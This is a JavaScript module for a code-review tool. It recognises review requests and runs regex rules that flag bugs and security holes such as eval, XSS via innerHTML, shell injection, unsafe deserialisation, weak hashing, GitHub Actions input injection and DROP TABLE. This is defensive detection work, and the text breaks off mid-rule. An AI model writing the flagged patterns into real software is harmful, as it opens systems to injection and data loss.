// void-review: skip-file (its rules contain the very patterns they look for)
// Void reviews code. Shared by the page (instant checks) and /api/answer mode 'review' (the deeper read by the model).
// Someone pastes code and asks for a review: the quick checks below run in the browser at once (bugs, security holes, risky
// habits, with line numbers), then the model reads the whole thing. Keys and passwords in the paste are masked before
// anything is shown, logged or sent (redact, lib/automation-fix.js). The checks are tuned to say nothing rather than
// something wrong: each one looks for a pattern that is almost always a real problem.
import { redact } from './automation-fix.js';

// "review my code", "code review", "check this script", "what's wrong with my function", "is this query safe", "find bugs in this"
const NOUN = '(?:code|script|function|snippet|program|pull\\s+request|pr|diff|class|method|query|sql|component|module|file|regex|github\\s+action|(?:ci|actions?|github)\\s+workflow|workflow\\s+(?:file|ya?ml))'; // "audit my github actions", "check this ci workflow"
const ASKS = [
  new RegExp('^(?:please\\s+|pls\\s+|hey\\s+void,?\\s+)?(?:(?:can|could|would|will)\\s+you\\s+)?(?:please\\s+)?(?:do\\s+a\\s+)?(?:code[- ]?review|review|critique|audit|lint|look\\s+over|go\\s+over|sanity[- ]check|check|proofread|improve|refactor|clean\\s+up|find\\s+(?:the\\s+)?bugs?\\s+in|spot\\s+(?:the\\s+)?bugs?\\s+in)\\s+(?:of\\s+)?(?:my|this|the|these|that|our|a|some|following)?\\s*(?:[\\w#+.-]+\\s+){0,2}?' + NOUN + 's?\\b', 'i'),
  /^(?:code[- ]?review|review\s+(?:please|pls|this|it))\b/i,
  /^(?:lint|critique|audit)\s+(?:this|it|that)\s*:\s*\S/i,
  /^(?:check|review|lint|audit)\s+(?:my|this|the)\s+(?:python|py|javascript|js|typescript|ts|sql|bash|shell|go|golang|rust|java|php|ruby|c\+\+|c#|swift|kotlin)\s*:\s*\S/i, // "check my python: <code>" // "lint this: var x = 1" (a colon and something after it, so "audit this" alone stays a word ask)
  new RegExp('\\b(?:what\'?s|what\\s+is|anything|something)\\s+wrong\\s+with\\s+(?:my|this|the)\\s+(?:[\\w#+.-]+\\s+)?' + NOUN + '\\b', 'i'),
  new RegExp('\\b(?:is|does)\\s+(?:my|this|the)\\s+(?:[\\w#+.-]+\\s+)?' + NOUN + '\\s+(?:ok|okay|good|fine|right|correct|safe|secure|look\\s+(?:ok|okay|good|right|fine))\\b', 'i'),
  /\b(?:any|find(?:\s+the)?|spot(?:\s+the)?)\s+bugs?\s+in\s+(?:my|this|the|these)\b/i,
  /\b(?:be\s+my|act\s+as\s+(?:a|my)|you\s+are\s+my)\s+code\s+reviewer\b/i,
];
// "check my zip code", "review the dress code": a code that isn't program code
const NOT_CODE = /\b(?:zip|area|postal|post|promo|promotional|discount|dress|morse|country|qr|coupon|gift|access|bar|cheat|tax|airport|iata|swift|sort|colou?r|hex|status|referral|invite|invitation|verification|confirmation|security|activation|redeem|voucher|pin|source\s+of)\s+codes?\b|\bcode\s+of\s+conduct\b|\bda\s+vinci\s+code\b/i;

export function isReviewAsk(text) {
  const s = String(text || '').trim(), first = s.split('\n')[0].replace(/\s*⏎.*$/, '').slice(0, 300);
  if (NOT_CODE.test(first)) return false;
  return ASKS.some((re) => re.test(first));
}

// the code itself: the lines after the ask, or what follows "review this code:" on one line
export function codeOf(text) {
  const s = String(text || '').replace(/\s*⏎\s*/g, '\n');
  const lines = s.split('\n');
  let code = '';
  if (lines.length > 1 && isReviewAsk(lines[0])) code = lines.slice(1).join('\n');
  else if (lines.length > 1) code = s;
  else { const k = s.search(/[:?]/); code = k > 0 && k < 120 && isReviewAsk(s.slice(0, k) + ': x') ? s.slice(k + 1).trim() : (isReviewAsk(s) ? '' : s); } // "review this: <code>", "is this code safe? <code>"
  code = code.replace(/^\s*```[\w.+#-]*[ \t]*\n?/, '').replace(/\n?```\s*$/, '');
  return code.replace(/^\n+|\s+$/g, '');
}

// enough code-like text to review (not a sentence)
// lang: the language the ask names ("review this python: ..."), so one short line in that language is enough
export function looksLikeCode(code, lang) {
  const s = String(code || '');
  if (s.trim().length < 8) return false;
  if (!lang && langOf(s) === 'yaml') lang = 'yaml'; // a pasted workflow or manifest counts as YAML even when the ask doesn't say so
  let n = 0;
  if (/[{};]\s*$/m.test(s)) n++;
  if (/\b(?:function|const|let|var|def|class|import|from|return|if|else|elif|for|while|public|private|static|void|func|fn|package|SELECT|INSERT|UPDATE|DELETE|CREATE|echo|fi|done|then|async|await|lambda|struct|impl|module|require|except|raise|try|catch|throw|assert|val|guard|DROP|ALTER|TRUNCATE|GRANT|REVOKE)\b/.test(s)) n++;
  if (/^\s*print\s+['"]/m.test(s)) n++; // Python 2's print 'x'
  if (/^\s*(?:FROM|RUN|COPY|ADD|ENV|ARG|EXPOSE|CMD|ENTRYPOINT|WORKDIR|USER|HEALTHCHECK)\s+\S/m.test(s)) n++; // a Dockerfile instruction (upper case, as written)
  if (lang === 'yaml' && /^\s*(?:-\s+)?[\w.-]+:(?:\s|$)/m.test(s)) n++; // key: value
  if (lang === 'powershell' && /\b[A-Z][a-z]+-[A-Z]\w+\b|\$\w+/.test(s)) n++; // Verb-Noun cmdlets, $variables
  if (lang === 'lua' && /\blocal\s+\w|\bfunction\b|^\s*end\s*$/m.test(s)) n++;
  if (/[=!<>]=|=>|->|\+\+|&&|\|\||::|:=|\w\(|\)\s*[{:]|\w\.\w+\s*[-+*/]?=[^=]/.test(s)) n++;
  if (/^(?: {2,}|\t)\S/m.test(s)) n++;
  if (/^\s*(?:#!|<\?php|<[a-z]+[\s>]|#include|@\w+)/m.test(s)) n++;
  if (/^\s*(?:const\s+|let\s+|var\s+)?[A-Za-z_$][\w$.]*\s*:?=\s*(?:["'`\[{]|-?\d|true\b|false\b|null\b|nil\b|None\b)[^\n]*$/.test(s.trim())) n += 2; // the whole paste is one assignment: password = "…" (or Go's password := "…")
  if (/^\s*[\w$.]+\([^()]*\)\s*;?\s*$/.test(s) && /[.(_$]|[a-z][A-Z]/.test(s.replace(/\(.*/, '(').slice(0, 60))) n++; // the whole paste is one call: eval(userInput)
  return n >= 2 || (n >= 1 && (!!lang || /^(?:shell|sql|python)$/.test(langOf(s)))) || /^\s*(?:sudo\s+)?(?:rm|cp|mv|chmod|chown|curl|wget|git|npm|pip|docker|kubectl|eval)\s+-?\S/m.test(s) || (lang === 'shell' && /^\s*(?:cat|grep|sed|awk|find|ls|echo|export|source)\s+\S/m.test(s));
}

// the language when the ask names it: "is this python code ok"
const NAMED = [['powershell', /\bpowershell\b|\bpwsh\b|\bps1\b/], ['terraform', /\bterraform\b|\bhcl\b|\btf\s*:/], ['dockerfile', /\bdocker\s*file\b|\bcontainerfile\b/], ['yaml', /\bya?ml\b|\bgithub\s+actions?\b|\b(?:ci|actions?|github)\s+workflows?\b|\bworkflow\s+file\b/], ['lua', /\blua\b/], ['perl', /\bperl\b/], ['python', /\bpython\b|\bpy\b/], ['typescript', /\btypescript\b|\bts\b/], ['javascript', /\bjavascript\b|\bjs\b|\bnode(?:\.?js)?\b|\breact\b/], ['sql', /\bsql\b|\bquery\b/], ['shell', /\bbash\b|\bshell\b|\bsh\b|\bzsh\b/], ['go', /\bgolang\b|\bgo\s+code\b|\bgo\s*:|\b(?:this|my|the|some)\s+go\s*$/], ['rust', /\brust\b/], ['java', /\bjava\b/], ['csharp', /\bc#|\bc\s*sharp\b/], ['php', /\bphp\b/], ['ruby', /\bruby\b/], ['kotlin', /\bkotlin\b/], ['swift', /\bswift\b/], ['c', /\bc\+\+|\bcpp\b|\bc\s+code\b|\bc\s*:|\b(?:this|my|the|some)\s+c\s*$/], ['html', /\bhtml\b|\bmarkup\b/], ['css', /\bcss\b|\bstylesheet\b|\bscss\b/]]; // markup last: "js that builds html" is JavaScript
export function langNamed(ask) { const a = String(ask || '').toLowerCase(); for (const [l, re] of NAMED) if (re.test(a)) return l; return null; }

export function langOf(code) {
  const s = String(code || '');
  // YAML first, before its run: blocks read as shell: a GitHub Actions workflow (jobs: with steps or runs-on) or a Kubernetes manifest
  if ((/^jobs:\s*$/m.test(s) && /^\s*(?:-\s+)?(?:runs-on|steps|uses):/m.test(s)) || (/^apiVersion:\s*\S/m.test(s) && /^kind:\s*\S/m.test(s))) return 'yaml';
  if (/^\s*#!.*\b(?:ba|z|k)?sh\b/m.test(s) || (/\b(?:fi|done|esac)\s*$/m.test(s) && /\b(?:then|do)\b/.test(s)) || /^\s*(?:sudo\s+)?(?:rm|cp|mv|echo|export|cd|apt(?:-get)?|chmod|curl|wget)\s/m.test(s) && !/[;{]\s*$/m.test(s)) return 'shell';
  if (/<\?php|\$\w+\s*->/.test(s)) return 'php';
  if (/^\s*(?:SELECT|INSERT\s+INTO|UPDATE\s+\w+\s+SET|DELETE\s+FROM|CREATE\s+(?:TABLE|INDEX|VIEW)|ALTER\s+TABLE|DROP\s+TABLE|WITH\s+\w+\s+AS)\b/im.test(s) && !/[{}]|\bdef\b|\bfunction\b|=>/.test(s)) return 'sql';
  if (/^\s*def\s+\w+\s*\([^)]*\)\s*(?:->\s*[\w\[\], ]+)?:/m.test(s) && !/[{};]\s*$/m.test(s)) return 'python';
  if (/^\s*(?:def|class)\s+\w+.*:\s*$|^\s*(?:import\s+\w+|from\s+[\w.]+\s+import)\b|^\s*(?:elif|except|try)\b.*:\s*$|\bprint\(|\bself\.|\bNone\b|\bTrue\b|\bFalse\b/m.test(s) && !/[{};]\s*$/m.test(s)) return 'python';
  if (/^\s*package\s+\w+|\bfunc\s+\w*\s*\(|:=/m.test(s) && !/\bfunction\b|=>/.test(s)) return 'go';
  if (/\bfn\s+\w+\s*\(|\blet\s+mut\b|\bimpl\b|println!/.test(s)) return 'rust';
  if (/\bpublic\s+(?:static\s+)?(?:class|void|int|string|String)\b|System\.out\.|Console\.Write/.test(s)) return /Console\.|\bstring\b|\busing\s+System/.test(s) ? 'csharp' : 'java';
  if (/^\s*#include\b|\bstd::|\bprintf\s*\(|\bint\s+main\s*\(/m.test(s)) return 'c';
  if (/^\s*(?:def\s+\w+|end|puts\s)/m.test(s) && /^\s*end\s*$/m.test(s)) return 'ruby';
  if (/^\s*<(?:!doctype|html|div|body|head|p|span|a|ul|li|form|input|button|section|main)\b/im.test(s) && !/\bfunction\b|=>/.test(s.replace(/<script[\s\S]*?<\/script>/gi, ''))) return 'html';
  if (/^\s*[.#]?[\w-]+(?:\s*[,>+~]\s*[.#]?[\w-]+)*\s*\{[^}]*:[^}]*\}/m.test(s) && !/\bfunction\b|=>|\bconst\b/.test(s)) return 'css';
  if (/\b(?:interface|type)\s+\w+\s*[={]|:\s*(?:string|number|boolean|any)\b|\bas\s+const\b/.test(s)) return 'typescript';
  if (/\b(?:function|const|let|var|=>|console\.|document\.|require\(|import\s.+\sfrom\s|export\s+(?:default|const|function))\b|=>/.test(s)) return 'javascript';
  return 'code';
}
const C_LIKE = new Set(['javascript', 'typescript', 'java', 'csharp', 'c', 'go', 'rust', 'php', 'kotlin', 'swift', 'css', 'code']);

// strings and comments become spaces (quotes kept, line breaks kept), so a rule never fires on text inside a string or a comment
export function mask(code, lang) {
  const s = String(code || ''), py = lang === 'python', sh = /^(?:shell|ruby|dockerfile|yaml|perl|powershell|terraform)$/.test(lang), sql = lang === 'sql' || lang === 'lua';
  let out = '', i = 0;
  const blank = (t) => t.replace(/[^\n]/g, ' ');
  while (i < s.length) {
    const c = s[i], two = s.slice(i, i + 2);
    if ((C_LIKE.has(lang) && two === '//') || (sql && two === '--') || ((py || sh) && c === '#' && !(sh && s[i - 1] === '$')) || (lang === 'php' && c === '#')) {
      const j = s.indexOf('\n', i); const end = j < 0 ? s.length : j; out += blank(s.slice(i, end)); i = end; continue;
    }
    if ((C_LIKE.has(lang) || sql) && two === '/*') { const j = s.indexOf('*/', i + 2); const end = j < 0 ? s.length : j + 2; out += blank(s.slice(i, end)); i = end; continue; }
    if (py && (s.startsWith('"""', i) || s.startsWith("'''", i))) { const q = s.slice(i, i + 3), j = s.indexOf(q, i + 3), end = j < 0 ? s.length : j + 3; out += q + blank(s.slice(i + 3, Math.max(i + 3, end - 3))) + (j < 0 ? '' : q); i = end; continue; }
    if (c === '"' || c === "'" || (c === '`' && !py && !sql)) {
      let j = i + 1;
      while (j < s.length && s[j] !== c && !(s[j] === '\n' && c !== '`')) { if (s[j] === '\\') j++; j++; }
      out += c + blank(s.slice(i + 1, j)) + (s[j] === c ? c : ''); i = s[j] === c ? j + 1 : j; continue;
    }
    out += c; i++;
  }
  return out;
}

// One rule = [id, kind, languages ('*' = any), test(maskedLine, rawLine, ctx) -> bool, plain message, fix (optional)]
// kind: 'bug' (wrong result or crash), 'risk' (security or data loss), 'style' (works, but easy to get wrong later)
const JS = ['javascript', 'typescript'];
// event fields anyone outside the repo can set (GitHub's list of untrusted input), as they appear inside ${{ }}
const GHA_UNTRUSTED = /\$\{\{[^}]*\b(?:github\.event\.(?:issue\.(?:title|body)|pull_request\.(?:title|body|head\.(?:ref|label)|head\.repo\.default_branch)|comment\.body|review\.body|review_comment\.body|discussion\.(?:title|body)|head_commit\.(?:message|author\.(?:email|name))|commits\b[^}]*\.(?:message|author\.(?:email|name))|workflow_run\.(?:head_branch|head_commit\.message)|pages\b[^}]*\.page_name)|github\.head_ref)\b/;
const RULES = [
  ['assign-in-condition', 'bug', [...JS, 'java', 'csharp', 'c', 'php'], (m) => /\b(?:if|while)\s*\(\s*!?\s*[A-Za-z_$][\w$.[\]]*\s*=\s*[^=>]/.test(m),
    'an assignment (=) inside the condition: it sets the value and is then always true or false. To compare, use === (or == outside JavaScript).'],
  ['loose-equality', 'style', JS, (m) => /[^=!<>]==[^=]|!=[^=]/.test(m) && !/[=!]=\s*null\b|\bnull\s*[=!]=[^=]/.test(m),
    '== and != convert types before comparing ("0" == 0 and "" == false are both true). === and !== compare exactly.'],
  ['nan-compare', 'bug', [...JS, 'java', 'csharp', 'python'], (m) => /[=!]==?\s*(?:NaN|float\(\s*'nan'\s*\))|\bNaN\s*[=!]==?/.test(m),
    'nothing is equal to NaN, not even NaN, so this comparison is always false. Use Number.isNaN(x) (math.isnan(x) in Python).'],
  ['typeof-typo', 'bug', JS, (m, r) => { const t = r.match(/typeof\s+[\w$.]+\s*[=!]==?\s*(['"])(\w*)\1/); return !!t && !/^(?:undefined|object|boolean|number|bigint|string|symbol|function)$/.test(t[2]); },
    'typeof never returns that word, so this check never passes. It returns one of: "undefined", "object", "boolean", "number", "bigint", "string", "symbol", "function".'],
  ['foreach-async', 'bug', JS, (m) => /\.forEach\(\s*async\b/.test(m),
    'forEach does not wait for async callbacks: the code after it runs before they finish, and their errors are lost. Use for (const x of items) { await … } or await Promise.all(items.map(async …)).'],
  // for…in over an object is right: skip it when the line shows object iteration (a hasOwnProperty guard, or the key
  // used as a name: setAttribute(k, …), setProperty(k, …))
  ['for-in-array', 'risk', JS, (m) => { const f = m.match(/\bfor\s*\(\s*(?:const|let|var)\s+(\w+)\s+in\s+\w+/); if (!f) return false; const k = f[1];
    return !new RegExp('hasOwn(?:Property)?(?:\\.call)?\\s*\\(\\s*(?:\\w+\\s*,\\s*)?' + k + '\\s*\\)|\\b(?:setAttribute|setAttributeNS|setProperty)\\s*\\(\\s*(?:[^,()]+,\\s*)?' + k + '\\s*,').test(m); },
    'for…in walks property names as strings (and inherited ones), not array values. For an array use for (const x of list), or for (let i = 0; i < list.length; i++).'],
  ['eval', 'risk', [...JS, 'python', 'php', 'ruby'], (m) => /(?:^|[^\w$.])(?:eval|exec)\s*\(|\bnew\s+Function\s*\(/.test(m),
    'eval/exec runs text as code: if any of that text comes from a user, a URL or a file, they can run anything. Parse the data instead (JSON.parse, a lookup table, ast.literal_eval in Python).'],
  ['inner-html', 'risk', JS, (m, r) => /\.(?:innerHTML|outerHTML)\s*\+?=/.test(m) && !/\.(?:innerHTML|outerHTML)\s*\+?=\s*(?:'[^'$]*'|"[^"$]*"|`[^`$]*`)\s*;?\s*(?:\}\s*\)?\s*;?\s*)?$/.test(r) && !/\besc(?:ape)?(?:Html)?\s*\(|[(,]\s*esc(?:ape)?(?:Html)?\s*[,)]|DOMPurify|sanitize/i.test(r), // a plain string, esc called, or handed to an HTML builder (card(esc, data))
    'putting a variable into innerHTML lets any HTML in it run (a script tag, an onerror handler): an XSS hole if the text can come from a user. Use textContent, or escape the text first.'],
  ['document-write', 'risk', JS, (m) => /\bdocument\.write(?:ln)?\s*\(/.test(m),
    'document.write wipes the whole page if it runs after loading, and writes raw HTML (XSS risk). Build elements with createElement and textContent.'],
  ['settimeout-string', 'risk', JS, (m) => /\bset(?:Timeout|Interval)\s*\(\s*['"`]/.test(m),
    'a string passed to setTimeout/setInterval is run like eval. Pass a function: setTimeout(() => doThing(), 1000).'],
  ['parseint-radix', 'style', JS, (m) => /\bparseInt\s*\(\s*[^,()]+(?:\([^()]*\))?\s*\)/.test(m),
    'parseInt without a base reads "0x1A" as hex and stops at the first non-digit. Give the base: parseInt(s, 10), or use Number(s).'],
  ['var', 'style', JS, (m) => /^\s*var\s+\w/.test(m),
    'var is visible across the whole function and can be re-declared by mistake. Use const (or let if it changes).'],
  ['debugger', 'bug', JS, (m) => /(?:^|[;{}\s])debugger\s*;?\s*$/.test(m),
    'a debugger statement pauses the page whenever developer tools are open. Remove it before shipping.'],
  ['empty-catch', 'risk', [...JS, 'java', 'csharp', 'php'], (m) => /\bcatch\s*(?:\(\s*(?!_|ignored?\b|unused\b)[^)]*\))?\s*\{\s*\}/.test(m), // catch (_) {} is the usual "ignored on purpose" mark; catch {} (no binding) is not
    'an empty catch hides every error, including real bugs, so failures happen silently. At least log it, or catch only the error you expect.'],
  ['bare-except', 'risk', ['python'], (m) => /^\s*except\s*:/.test(m),
    'a bare except also catches Ctrl+C and typos (NameError), hiding real bugs. Catch the error you expect: except ValueError:'],
  ['except-pass', 'risk', ['python'], (m, r, x) => (/^\s*except\b.*:\s*$/.test(m) && /^\s*pass\s*$/.test(x.next(1))) || /^\s*except\b[^:]*:\s*pass\s*$/.test(m),
    'except … : pass swallows the error silently, so the program carries on with bad data. Log it or handle it.'],
  ['mutable-default', 'bug', ['python'], (m) => /^\s*def\s+\w+\s*\(.*=\s*(?:\[\s*\]|\{\s*\}|set\(\s*\)|list\(\s*\)|dict\(\s*\))\s*[,)]/.test(m),
    'a default of [] or {} is created once and shared by every call, so changes leak between calls. Use None and create it inside: def f(x=None): x = [] if x is None else x'],
  ['is-literal', 'bug', ['python'], (m) => /\bis\s+(?:not\s+)?(?:-?\d|['"])/.test(m),
    '"is" checks whether two things are the same object, not equal values, so it can be False for equal numbers or strings. Use == (keep "is" for None, True and False).'],
  ['eq-none', 'style', ['python'], (m) => /[=!]=\s*None\b/.test(m),
    'compare with None using "is None" / "is not None": == can be overridden by a class and give a wrong answer.'],
  ['range-len', 'style', ['python'], (m) => /\bfor\s+\w+\s+in\s+range\s*\(\s*len\s*\(/.test(m),
    'for i in range(len(x)) is easy to get off by one. Use for item in x, or for i, item in enumerate(x).'],
  ['open-no-with', 'style', ['python'], (m) => /^\s*\w+\s*=\s*open\s*\(/.test(m),
    'a file opened without "with" stays open if anything fails before close(). Use: with open(path) as f:'],
  ['shell-true', 'risk', ['python'], (m) => /\bshell\s*=\s*True\b/.test(m),
    'shell=True runs the command through a shell, so a filename or input with ; or $( ) can run other commands. Pass a list: subprocess.run(["ls", path])'],
  ['unsafe-load', 'risk', ['python'], (m) => /\byaml\.load\s*\((?![^)]*Loader\s*=\s*(?:yaml\.)?SafeLoader)|\bpickle\.loads?\s*\(/.test(m),
    'yaml.load and pickle can run code hidden in the data. Use yaml.safe_load, and only unpickle data you created yourself.'],
  ['os-system-concat', 'risk', ['python'], (m, r) => /\bos\.(?:system|popen)\s*\(/.test(r) && (/['"]\s*\+|\+\s*['"]|\bf['"][^'"]*\{|['"]\s*%\s*[\w(]|\.format\s*\(/.test(r) || /\bos\.(?:system|popen)\s*\(\s*[A-Za-z_]\w*\s*\)/.test(r)),
    'the shell command is built from text: a name or input containing ; or $( ) runs other commands (shell injection). Use subprocess.run with a list, no shell: subprocess.run(["rm", "-rf", path])'],
  ['php-echo-input', 'risk', ['php'], (m, r) => /\b(?:echo|print)\b[^;]*\$_(?:GET|POST|REQUEST|COOKIE|SERVER)\b/.test(r.replace(/\b(?:htmlspecialchars|htmlentities|esc_html|esc_attr|intval|urlencode)\s*\((?:[^()]|\([^()]*\))*\)/g, '')), // each printed value: escaped ones are taken out, any raw one left is flagged
    'request input is printed straight into the page, so a value like <script>…</script> runs in the visitor\'s browser (XSS). Escape it first: echo htmlspecialchars($_GET[\'name\'], ENT_QUOTES, \'UTF-8\');'],
  ['ruby-shell-interp', 'risk', ['ruby'], (m, r) => /(?:\bsystem|\bexec|\bspawn|%x)\s*[(\[{]?\s*"[^"]*#\{|`[^`]*#\{/.test(r),
    'the shell command has a value pasted in with #{}: a value containing ; or $( ) runs other commands (shell injection). Pass the arguments separately: system("ls", dir)'],
  ['assert-check', 'risk', ['python'], (m) => /^\s*assert\b.*(?:admin|auth|permission|allowed|logged_?in|staff|superuser|\brole|owner|\bcan_)/i.test(m),
    'assert is removed when Python runs optimised (python -O), so this check silently disappears and everyone gets through. Use a real check: if not user.is_admin: raise PermissionError()'],
  ['regexp-input', 'risk', JS, (m) => /\bnew\s+RegExp\s*\(\s*(?!['"`/])[A-Za-z_$][\w$.[\]]*\s*[,)]/.test(m),
    'a pattern built from a variable: if it comes from a user, characters like . * ( are read as regex, and a crafted pattern can hang the page (ReDoS). Escape it first: new RegExp(s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"))'],
  ['weak-random', 'risk', ['python', ...JS], (m) => /\b(?:token|password|passwd|secret|nonce|salt|otp|session_?id|api_?key|reset_?code)\w*\s*=.*(?:\brandom\.(?:random|randint|choice|choices|randrange|getrandbits)\s*\(|\bMath\.random\s*\()/i.test(m),
    'random.random and Math.random are predictable, so a token made with them can be guessed. Use secrets.token_urlsafe() in Python, or crypto.randomUUID() / crypto.getRandomValues() in JavaScript.'],
  ['weak-random-jvm', 'risk', ['java', 'kotlin', 'csharp'], (m, r, x) => /(?:\bnew\s+(?:java\.util\.|System\.)?Random\s*\(|(?:^|[=(,:]\s*)(?:kotlin\.random\.)?Random\s*\(\s*\))/.test(m) && /\b(?:token|password|passwd|secret|nonce|salt|otp|session_?id|api_?key|reset_?code)\w*/i.test(x.statement() + ' ' + x.next(1)),
    'java.util.Random (and System.Random) is predictable: anyone who sees a few values can work out the next ones, so tokens, passwords and codes made with it can be guessed. Use SecureRandom (RandomNumberGenerator in C#)'],
  ['c-unsafe-string', 'risk', ['c'], (m) => /\b(?:gets|strcpy|strcat|sprintf)\s*\(/.test(m),
    'gets, strcpy, strcat and sprintf write without checking the size of the buffer, so a long input overflows it (a crash, or a way in for an attacker). Use fgets(buf, sizeof buf, stdin), snprintf, or copy with an explicit length.'],
  ['unwrap', 'style', ['rust'], (m) => /\.unwrap\s*\(\s*\)/.test(m),
    'unwrap() panics (crashes the program) when the value is None or an Err. Handle it with match / if let, pass it up with ?, or use expect("why this cannot fail").'],
  ['force-unwrap', 'risk', ['kotlin', 'swift'], (m, r, x) => x.lang === 'kotlin' ? /!!/.test(m) : /[\w)\]]!(?![=!])/.test(m.replace(/!=/g, '')),
    'a force unwrap (!! in Kotlin, ! in Swift) crashes the app when the value is null/nil. Handle the missing case: ?. with ?: in Kotlin, if let / guard let or ?? in Swift.'],
  ['string-eq', 'bug', ['java'], (m) => /[=!]=\s*"|"\s*[=!]=/.test(m),
    'in Java, == on strings checks whether they are the same object, not the same text, so equal strings can compare false. Use "yes".equals(s) (safe when s is null).'],
  ['var-loop-closure', 'bug', JS, (m) => /\bfor\s*\(\s*var\s+\w+[^)]*\)\s*(?:\{[^}]*|[^;{]*)(?:\bset(?:Timeout|Interval)\s*\(|\.addEventListener\s*\(|\.on\w+\s*=|\.then\s*\(|\.push\s*\(\s*(?:function\b|\([^)]*\)\s*=>|\w+\s*=>))/.test(m), // a callback that runs later (a timer, a listener, a promise, one stored for later), inside the loop body; .some/.map/.filter run at once and are fine
    'a var in a for loop is shared by every pass, so callbacks created in the loop all see its final value. Declare it with let: for (let i = 0; …).'],
  ['json-parse-storage', 'bug', JS, (m) => /\bJSON\.parse\s*\(\s*(?:window\.)?(?:localStorage|sessionStorage)\.getItem\s*\(/.test(m) && !/\btry\b/.test(m),
    'JSON.parse throws on text that is not valid JSON (an old format, a hand edit, a half-written save), and that stops the page. Wrap it in try/catch and fall back to a default.'],
  ['busy-loop', 'bug', ['python'], (m, r, x) => /^\s*while\s+(?:True|1)\s*:\s*pass\b/.test(m) || (/^\s*while\s+(?:True|1)\s*:\s*$/.test(m) && /^\s*pass\s*$/.test(x.next(1))),
    'while True: pass spins forever at full speed, using a whole CPU core and never stopping. Wait on something (time.sleep, an event, input) or add a condition that ends the loop.'],
  ['sort-no-compare', 'style', JS, (m) => /\.sort\s*\(\s*\)/.test(m),
    'sort() with no compare function sorts as text, so numbers come out wrong: [10, 9, 1] becomes [1, 10, 9]. For numbers pass one: list.sort((a, b) => a - b).'],
  ['indexof-truthy', 'bug', JS, (m) => /\b(?:if|while)\s*\(\s*!?\s*[\w$.[\]]+\.indexOf\s*\([^()]*\)\s*(?:\)|&&|\|\|)/.test(m),
    'indexOf returns -1 when the item is missing (which counts as true) and 0 when it is first (which counts as false), so this check is backwards in both cases. Use list.includes(x), or compare: list.indexOf(x) !== -1.'],
  ['listener-called', 'bug', JS, (m, r) => /\.addEventListener\s*\(/.test(m) && /\.addEventListener\s*\(\s*(['"`])[\w:-]+\1\s*,\s*[\w$.]+\s*\(\s*\)\s*[,)]/.test(r), // handler(): a factory with arguments, makeHandler(1), is fine
    'the handler is called right away (handler()) and its result is what gets attached, so nothing happens on the event. Pass the function itself: addEventListener("click", handler), or wrap it: () => handler(arg).'],
  ['float-equality', 'bug', [...JS, 'python', 'java', 'csharp'], (m) => { const c = m.replace(/['"`][^'"`]*['"`]/g, '""'); // 1.25, 0.5, 0.75 are exact in binary: == on them alone is safe
    if (!/\d\.\d*[1-9]\d*\s*(?:[-+*/]\s*[\d.]+[^=!<>]*)?[=!]==?|[=!]==?\s*-?\d*\.\d*[1-9]/.test(c)) return false;
    const decs = c.match(/\d*\.\d+/g) || [];
    return !decs.length || !decs.every((d) => { const v = Number(d); return [1, 2, 4, 8, 16, 32].some((k) => Number.isInteger(v * k)); }); },
    'decimal numbers are stored in binary, so sums like 0.1 + 0.2 come out as 0.30000000000000004 and an exact == fails. Compare with a small tolerance: Math.abs(a - b) < 1e-9 (math.isclose in Python), or work in whole cents.'],
  ['drop-table', 'risk', ['sql', 'shell', 'code'], (m) => /^\s*(?:DROP\s+(?:TABLE|DATABASE|SCHEMA)\b|TRUNCATE\s+(?:TABLE\s+)?[\w."`[\]]+)/i.test(m),
    'this deletes the table (or database) and every row in it, and there is no undo. Take a backup first, and in a migration say exactly what you mean: DROP TABLE IF EXISTS old_name.'],
  ['comma-join', 'bug', ['sql'], (m, r, x) => /\bFROM\s+[\w."`[\]]+(?:\s+(?:AS\s+)?\w+)?\s*,\s*[\w."`[\]]+/i.test(m) && !/\bWHERE\b|\bON\b/i.test(x.statement()),
    'two tables after FROM with no WHERE pairs every row of one with every row of the other (a cross join): 1,000 × 1,000 rows is a million. Use JOIN … ON a.id = b.a_id.'],
  ['for-ls', 'bug', ['shell'], (m) => /\bfor\s+\w+\s+in\s+(?:\$\(\s*ls\b|`\s*ls\b)/.test(m),
    'looping over the output of ls splits file names with spaces into pieces (and breaks on other odd names). Let the shell list them: for f in *.txt; do echo "$f"; done'],
  ['unquoted-test', 'bug', ['shell'], (m) => /(?:^|[;&|\s])\[\s+\$\{?\w+\}?\s+(?:==?|!=|-eq|-ne|-lt|-gt|-le|-ge)\s/.test(m),
    'an unquoted $variable inside [ ]: if it is empty, the test becomes [ == 1 ] and fails with an error. Quote it: [ "$x" = 1 ] (and use = inside [ ]; == only works in bash).'],
  ['weak-hash', 'risk', ['*'], (m, r) => /\b(?:md5|sha1)\s*\([^)]*(?:pass(?:word|wd)?|\bpw|pwd)\b|createHash\s*\(\s*['"`](?:md5|sha1)['"`]\s*\)\s*\.update\s*\([^)]*(?:pass(?:word|wd)?|\bpw|pwd)\b/i.test(r), // the password must be what is hashed, not just named on the line
    'md5 and sha1 are fast hashes, so a leaked table of password hashes can be cracked in hours. Use a slow password hash: password_hash() in PHP, bcrypt or argon2 in JavaScript, hashlib.scrypt or argon2 in Python.'],
  ['cors-any', 'risk', JS, (m, r, x) => /\borigin\s*:\s*(?:(['"`])\*\1|true\b)/.test(r) && /\bcredentials\s*:\s*true\b/.test(x.object()), // both options in the same { … }, on one line or several
    'CORS that allows any origin together with credentials lets any site make logged-in requests on behalf of your users. List the origins you trust: origin: ["https://app.example.com"].'],
  ['debug-true', 'risk', ['python'], (m) => /\.run\s*\([^)]*\bdebug\s*=\s*True\b|^\s*DEBUG\s*=\s*True\b/.test(m),
    'debug mode shows full error pages, and Flask\'s debugger can run code from the browser. Keep it for your own machine; read it from an environment variable so production runs with it off.'],
  ['jwt-none', 'risk', [...JS, 'python'], (m, r) => /algorithms?\s*[:=]\s*\[?\s*(['"])none\1/i.test(r),
    'accepting the "none" algorithm means a token with no signature passes, so anyone can forge one. List only the algorithm you sign with: algorithms: ["HS256"].'],
  ['go-empty-err', 'bug', ['go'], (m) => /\bif\s+err\s*!=\s*nil\s*\{\s*\}/.test(m),
    'the error is checked and then nothing is done with it, so the program carries on as if the call worked. Return it (return err, or wrap it: fmt.Errorf("reading config: %w", err)) or log it.'],
  ['go-race', 'risk', ['go'], (m, r, x) => /\bgo\s+func\s*\([^)]*\)\s*\{[^}]*?\b[\w.]+\s*(?:\+\+|--|[+\-*/]?=(?!=))/.test(x.statement()) && !/\b(?:Lock|RLock|atomic\.|chan\b|<-)/.test(x.statement()),
